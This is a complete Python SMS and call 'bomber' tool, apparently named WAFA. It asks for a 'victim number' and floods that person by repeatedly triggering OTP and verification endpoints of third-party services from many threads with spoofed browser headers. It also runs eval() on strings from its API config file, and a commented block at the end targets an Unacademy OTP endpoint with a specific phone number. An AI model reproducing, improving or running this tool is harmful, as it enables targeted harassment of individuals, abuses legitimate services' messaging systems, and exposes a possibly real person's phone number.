import os
import json
import re
import time
import _thread
import base64
import requests
from datetime import datetime


class Colors:
    RESET = "\033[0m"
    DEFAULT_FG = "\033[39m"
    DEFAULT_BG = "\033[49m"
    BLACK_FG = "\033[30m"
    BLACK_BG = "\033[40m"
    DARK_RED_FG = "\033[31m"
    DARK_RED_BG = "\033[41m"
    DARK_GREEN_FG = "\033[32m"
    DARK_GREEN_BG = "\033[42m"
    DARK_YELLOW_FG = "\033[33m"
    DARK_YELLOW_BG = "\033[43m"
    DARK_BLUE_FG = "\033[34m"
    DARK_BLUE_BG = "\033[44m"
    DARK_MAGENTA_FG = "\033[35m"
    DARK_MAGENTA_BG = "\033[45m"
    DARK_CYAN_FG = "\033[36m"
    DARK_CYAN_BG = "\033[46m"
    LIGHT_GRAY_FG = "\033[37m"
    LIGHT_GRAY_BG = "\033[47m"
    DARK_GRAY_FG = "\033[90m"
    DARK_GRAY_BG = "\033[100m"
    RED_FG = "\033[91m"
    RED_BG = "\033[101m"
    GREEN_FG = "\033[92m"
    GREEN_BG = "\033[102m"
    ORANGE_FG = "\033[93m"
    ORANGE_BG = "\033[103m"
    BLUE_FG = "\033[94m"
    BLUE_BG = "\033[104m"
    MAGENTA_FG = "\033[95m"
    MAGENTA_BG = "\033[105m"
    CYAN_FG = "\033[96m"
    CYAN_BG = "\033[106m"
    WHITE_FG = "\033[97m"
    WHITE_BG = "\033[107m"


LOGO = base64.b64decode(
    b"CntDb2xvcnMuT1JBTkdFX0ZHfQogICAgIC5TICAgICBTLiAgICAuU19"
    b"TU1NzICAgICAgc1NTcyAgIC5TX1NTU3MgICAgCiAgICAuU1MgICAgIFN"
    b"TLiAgLlNTflNTU1NTICAgIGQlJVNQICAuU1N+U1NTU1MgICAKICAgI"
    b"FMlUyAgICAgUyVTICBTJVMgICBTU1NTICBkJVMnICAgIFMlUyAgIFNTU1"
    b"MgIAogICAgUyVTICAgICBTJVMgIFMlUyAgICBTJVMgIFMlUyAgICAgUyV"
    b"TICAgIFMlUyAgCiAgICBTJVMgICAgIFMlUyAgUyVTIFNTU1MlUyAgUyZT"
    b"ICAgICBTJVMgU1NTUyVTICAKICAgIFMmUyAgICAgUyZTICBTJlMgIFNTU"
    b"yVTICBTJlNfU3MgIFMmUyAgU1NTJVMgIAogICAgUyZTICAgICBTJlMgIF"
    b"MmUyAgICBTJlMgIFMmU35TUCAgUyZTICAgIFMmUyAgCiAgICBTJlMgICA"
    b"gIFMmUyAgUyZTICAgIFMmUyAgUyZTICAgICBTJlMgICAgUyZTICAKICAg"
    b"IFMqUyAgICAgUypTICBTKlMgICAgUyZTICBTKmIgICAgIFMqUyAgICBTJ"
    b"lMgIAogICAgUypTICAuICBTKlMgIFMqUyAgICBTKlMgIFMqUyAgICAgUy"
    b"pTICAgIFMqUyAgCiAgICBTKlNfc1NzX1MqUyAgUypTICAgIFMqUyAgUyp"
    b"TICAgICBTKlMgICAgUypTICAKICAgIFNTU35TU1N+UypTICBTU1MgICAg"
    b"UypTICBTKlMgICAgIFNTUyAgICBTKlMgIAogICAgICAgICAgICAgICAgI"
    b"CAgICAgICBTUCAgIFNQICAgICAgICAgICAgIFNQICAgCiAgICAgICAgIC"
    b"AgICAgICAgICAgICAgIFkgICAgWSAgICAgICAgICAgICAgWQoKIHtDb2xvc"
    b"nMuREFSS19SRURfRkd9W3tDb2xvcnMuREFSS19HUkVFTl9GR31UaGUgbW9z"
    b"dCBpbnRlbGxpZ2VudCBzbXMgYW5kIGNhbGwgYm9tYmVyIG9uIGVhcnRoe0N"
    b"vbG9ycy5EQVJLX1JFRF9GR31dCiAgICAgICAgICAgIAogICAgICAgICAgIC"
    b"B7Q29sb3JzLkRBUktfQkxVRV9GR31BdXRob3IgOiB7Q29sb3JzLkNZQU5fR"
    b"kd9QFQtRHluYW1vcwogICAgICAgICAgICB7Q29sb3JzLkRBUktfQkxVRV9G"
    b"R31Db3B5cmlnaHQgOiB7Q29sb3JzLkNZQU5fRkd9TXIuIFBlcmZlY3QK"
).decode()
LOGO = eval(f'f"""{LOGO}"""')

INFO = (
    lambda STR, i="!": f"{Colors.BLUE_FG}[{Colors.MAGENTA_FG}{i}{Colors.RESET}{Colors.BLUE_FG}]{Colors.WHITE_FG} {STR}"
)
ERROR = (
    lambda STR, i="x": f"{Colors.BLUE_FG}[{Colors.RED_FG}{i}{Colors.RESET}{Colors.BLUE_FG}]{Colors.RED_FG} {STR}"
)
INPUT = lambda STR, i=">": input(
    f"{Colors.BLUE_FG}[{Colors.CYAN_FG}{i}{Colors.RESET}{Colors.BLUE_FG}]{Colors.CYAN_FG} {STR}{Colors.GREEN_FG}>> {Colors.RESET}"
)

MENU = f"""{INFO('SMS', i = "1")}
{INFO('CALL', i = "2")}
{INFO('CHANGE APIDATA', i='*')}

{Colors.ORANGE_FG}Use Ctrl + C to exit

{Colors.GREEN_FG}>> {Colors.RESET}"""


def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def get_config_path():
    if os.name == "posix" or os.name == "mac":
        return os.path.expanduser("~/.config/WAFA")
    elif os.name == "nt":
        return os.path.join(os.getenv("APPDATA"), "WAFA")
    else:
        return os.path.join(os.path.expanduser("~"), ".config", "WAFA")

escape_unix_colors = lambda s: re.sub(r'\x1b\[[0-9;]+m', '', s)

def safe_print(string, bomber_class):
    const = (
        38
        + len(str(bomber_class.FAILED))
        + len(str(bomber_class.ONGOING))
        + len(str(bomber_class.BOMBED))
    )
    if len(escape_unix_colors(string)) < const:

        print(string + " " * (const - len(escape_unix_colors(string))))
    else:
        print(string)

class Bomber:
    DEFAULT_HEADER = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-IN,en;q=0.9",
        "Sec-Ch-Ua": '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Linux"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        "(KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    }

    call_apis = []
    sms_apis = []

    BOMBED = 0
    FAILED = 0
    ONGOING = 0

    def __init__(self, api_data):
        self.api_data = api_data
        self.load_api()

    def load_api(self):
        for api in self.api_data.keys():
            if api.startswith("CALL:"):
                for _ in range(self.api_data[api]["duplicate"] if "duplicate" in self.api_data[api].keys() else 1):
                    self.call_apis += [
                        BombRequest(api.split(":")[-1], self, **self.api_data[api])
                    ]
            elif api.startswith("SMS:"):
                for _ in range(self.api_data[api]["duplicate"] if "duplicate" in self.api_data[api].keys() else 1):
                    self.sms_apis += [
                        BombRequest(api.split(":")[-1], self, **self.api_data[api])
                    ]

    def get_string(self):
        return INFO(
            f"{Colors.GREEN_FG}BOMBED : {Colors.MAGENTA_FG}{self.BOMBED} "
            f"{Colors.RED_FG}FAILED : {Colors.MAGENTA_FG}{self.FAILED} "
            f"{Colors.ORANGE_FG}ONGOING : {Colors.MAGENTA_FG}{self.ONGOING}"
        )

    def print_progress(self):
        while True:
            print(
                self.get_string(),
                end="\r",
            )
            time.sleep(0.16)


class BombRequest:
    RUNNING = False

    def __init__(
        self,
        name: str,
        bomb_class: Bomber,
        headers={},
        url="",
        cookies={},
        sleep_time=1,
        method="GET",
        identifier="",
        data={},
        params={},
        modifier_map={},
        initiator={},
        init_sleep=0,
        datatype="json",
        stop_identifier=None,
        duplicate = 0,
    ):
        self.name = name
        self.url = url
        self.bomb_class = bomb_class
        self.sleep_time = sleep_time
        self.method = method
        self.identifier = identifier
        self.data = data
        self.params = params
        self.modifier_map = modifier_map 
        self.datatype = datatype
        self.request_session = requests.session()
        #self.request_session.proxies = {              
        #    "http"  : "127.0.0.1:5678",
        #    "https" : "127.0.0.1:5678"
        #}
        self.request_session.headers = bomb_class.DEFAULT_HEADER
        self.initiator = initiator
        self.stop_identifier = stop_identifier
        self.init_sleep = 30

        if len(list(headers.keys())) > 0:
            for _ in headers:
                self.request_session.headers[_] = headers[_]

        if len(list(cookies.keys())) > 0:
            self.cookies = cookies
            self.request_session.cookies.update(self.cookies)

    def apply_modifier(self, target):
        for modifier in self.modifier_map.keys():
            modifier_object = self.modifier_map[modifier]
            modifier = modifier.strip(":")
            try:
                if isinstance(modifier_object, str):
                    getattr(self, modifier)[modifier_object] = getattr(self, modifier)[
                        modifier_object
                    ].format(target)
                elif isinstance(modifier_object, int):
                    if modifier_object == 1:
                        setattr(self, modifier, eval(f'f"""{getattr(self, modifier)}"""'))
                    else:
                        setattr(self, modifier, getattr(self, modifier).format(target))
                elif isinstance(modifier_object, dict):
                    getattr(self, modifier)[list(modifier_object.keys())[0]] = {
                        "int": int,
                        "str": str,
                        "json":json.loads,
                    }[modifier_object[list(modifier_object.keys())[0]]](
                        eval(
                            f'f"""{getattr(self, modifier)[list(modifier_object.keys())[0]]}"""'
                        )
                    )
                    if modifier == "cookies":
                        self.request_session.cookies.update(self.cookies)
            except Exception as e:
                raise e
                safe_print(
                    ERROR(
                        Colors.GREEN_FG
                        + self.name
                        + f" : {modifier}, {modifier_object} "
                        + Colors.RED_FG
                    )
                    + str(e),
                    bomber_class=self.bomb_class,
                )

    def apply_initiator_modifier(self, data, modifier_map, target):
        for modifier in modifier_map.keys():
            modifier_object = modifier_map[modifier]
            if isinstance(modifier_object, str):
                data[modifier_object] = data[modifier_object].format(target)

            elif isinstance(modifier_object, dict):
                data[list(modifier_object.keys())[0]] = eval(
                    f'f"""{data[list(modifier_object.keys())[0]]}"""'
                )
                if modifier == "cookies":
                    self.request_session.cookies.update(self.cookies)
        return data

    def handle_non_serializable(self, obj):
        return str(obj)

    def execute(self):
        # print(json.dumps(vars(self), default=self.handle_non_serializable, indent =4))
        self.bomb_class.ONGOING += 1
        if self.method == "GET":
            result = self.request_session.get(self.url, params=self.params)
        elif self.method == "POST":
            if self.datatype == "json":
                result = self.request_session.post(self.url, json=self.data, params=self.params)
            else:
                result = self.request_session.post(self.url, data=self.data, params=self.params)
        if self.stop_identifier is not None:
            if self.stop_identifier in result.text:
                safe_print(
                    INFO(
                        Colors.ORANGE_FG
                        + self.name
                        + " : "
                        + Colors.RED_FG
                        + "Max limit reached."
                    ),
                    bomber_class=self.bomb_class,
                )
                return self.stop()

        if self.identifier in result.text:
            self.bomb_class.BOMBED += 1
        else:
            safe_print(
                    ERROR(Colors.CYAN_FG + self.name + " : " + Colors.RED_FG + (result.text if "\n" not in result.text else result.text.split("\n")[0] + " ... (Lines split!)" )),
                bomber_class=self.bomb_class,
            )
            self.bomb_class.FAILED += 1
        self.bomb_class.ONGOING -= 1

    init_result = None

    def start(self, target):
        if self.initiator != {} and self.init_result is None:
            if self.initiator["method"] == "POST":
                self.init_result = self.request_session.post(
                    self.initiator["url"],
                    data=self.apply_initiator_modifier(
                        self.initiator["data"], self.initiator["modifier_map"], target
                    ),
                ).json()
                safe_print(
                    INFO(
                        Colors.GREEN_FG
                        + self.name
                        + " : "
                        + Colors.CYAN_FG
                        + str(self.init_result)
                    ),
                    bomber_class=self.bomb_class,
                )
                time.sleep(self.init_sleep)
            elif self.initiator["method"] == "GET":
                # TODO: implement it
                init_result = self.request_session.post(
                    self.initiator["url"], headers=self.headers
                ).text

        try:
            self.apply_modifier(target)
        except Exception:
            print(self.data)
        self.RUNNING = True
        while self.RUNNING:
            self.execute()
            time.sleep(self.sleep_time)

    def stop(self):
        self.RUNNING = False
        self.init_result = None


class MainMenu:
    def __init__(self):
        clear_screen()
        print(LOGO)
        self.init_config()

    def init_config(self):
        config_path = get_config_path()
        if not os.path.exists(config_path):
            os.mkdir(config_path)
        self.config_json_path = os.path.join(config_path, "config.json")
        if not os.path.isfile(self.config_json_path):
            self.write_config({"api": None})

    def read_config(self):
        with open(self.config_json_path, "r") as file:
            __ = json.load(file)
            file.close()
        return __

    def write_config(self, data):
        with open(self.config_json_path, "w") as file:
            json.dump(data, file)
            file.close()

    def validate_api(self):
        API_FILE = self.read_config()["api"]
        self.API_DATA = None

        if API_FILE is not None and os.path.exists(API_FILE):
            with open(API_FILE, "r") as file:
                try:
                    self.API_DATA = json.load(file)
                except Exception:
                    self.API_DATA = None
                if (
                    self.API_DATA is None
                    or not list(self.API_DATA.keys())[0] == "WAFA_API"
                ):
                    ERROR("Api data file is not valid!")
                    self.API_DATA = None
                    self.write_config({"api": None})
                    self.validate_api()
                    return

        if API_FILE is None:
            file_path = INPUT("Enter valid path to api file: ")
            if os.path.exists(file_path):
                with open(file_path, "r") as file:
                    try:
                        self.API_DATA = json.load(file)
                        file.close()
                    except Exception as e:
                        print(ERROR(e))
                        self.API_DATA = None
                    if (
                        self.API_DATA is None
                        or not list(self.API_DATA.keys())[0] == "WAFA_API"
                    ):
                        print(ERROR("Api data file is not valid!"))
                        self.validate_api()
                        return
                    else:
                        self.write_config({"api": os.path.abspath(file_path)})
                        print(INFO("File is valid! Saved to settings."))
            else:
                print(ERROR("File does not exists!"))
                self.validate_api()

        return self.API_DATA["WAFA_API"]

    def load_api(self):
        self.BOMBER = Bomber(self.validate_api())

    def thread(self, function, *args):
        _thread.start_new_thread(function, args)

    def restart(self):
        if INPUT("Do you want to restart [y/n] : ").lower().strip() == "y":
            clear_screen()
            print(LOGO)
            self.__()
            return
        else:
            exit(0)

    def __(self):
        if not hasattr(self, "BOMBER"):
            self.load_api()
        print(
            INFO(
                f"Loaded {len(self.BOMBER.sms_apis)} sms api and {len(self.BOMBER.call_apis)} call api.\n"
            )
        )
        try:
            user_input = input(MENU).strip()
        except KeyboardInterrupt:
            exit(0)
        if user_input not in ["*", "1", "2"]:
            clear_screen()
            print(LOGO)
            self.__()
            return
        if user_input == "1":
            print()
            print(INFO(f"Approx. {int(len(self.BOMBER.sms_apis)*4)} sms will be sent in minimum time"))
            target = INPUT("Enter victim number +91 ").strip()
            try:
                _ = int(target)
            except Exception:
                print(ERROR("Invalid number!"))
                self.restart()
                return
            if len(target) != 10:
                print(ERROR("Should be of 10 digits! : "))
                self.restart()
                return
            print(INFO("Starting sms bomber..."))
            for api in self.BOMBER.sms_apis:
                self.thread(api.start, target)
            try:
                self.BOMBER.print_progress()
            except KeyboardInterrupt:
                print("", end="\r")
                safe_print(INFO("Bomber stopped."), bomber_class=self.BOMBER)
                print(self.BOMBER.get_string().split("ONGOING")[0])
                for api in self.BOMBER.sms_apis:
                    api.stop()
                self.BOMBER.ONGOING = 0
                self.BOMBER.FAILED = 0
                self.BOMBER.BOMBED = 0
                self.restart()
                return
        if user_input == "2":
            print()
            print(INFO(f"Approx. {int(len(self.BOMBER.call_apis)*3)} call will be sent in minimum time"))
            target = INPUT("Enter victim number +91 : ").strip()
            try:
                _ = int(target)
            except Exception:
                print(ERROR("Invalid number!"))
                self.restart()
                return
            if len(target) != 10:
                print(ERROR("Should be of 10 digits! : "))
                self.restart()
                return
            print(INFO("Starting call bomber..."))
            for api in self.BOMBER.call_apis:
                self.thread(api.start, target)
            try:
                self.BOMBER.print_progress()
            except KeyboardInterrupt:
                print("", end="\r")
                print(INFO("Bomber stopped." + " " * 20))
                print(self.BOMBER.get_string().split("ONGOING")[0])
                for api in self.BOMBER.call_apis:
                    api.stop()
                self.restart()
                return
        if user_input == "*":
            self.write_config({"api": None})
            self.validate_api()
            self.restart()
            return


MainMenu().__()
"""
api = BombRequest("TestApi", 
**{
                    "url":"https://unacademy.com/api/v3/user/user_check/?enable-email=true",
                "method":"POST",
                "data":{
                    "phone":"{}",
                    "country_code":"IN",
                    "otp_type":2,
                    "email":"",
                    "send_otp":True,
                    "is_un_teach_user":False
                },
                "modifier_map":{"data":"phone"},
                "identifier":"Call has been initiated",
                "sleep_time":60},
                  bomb_class=Bomber({})
)
api.start("8556801392")
"""
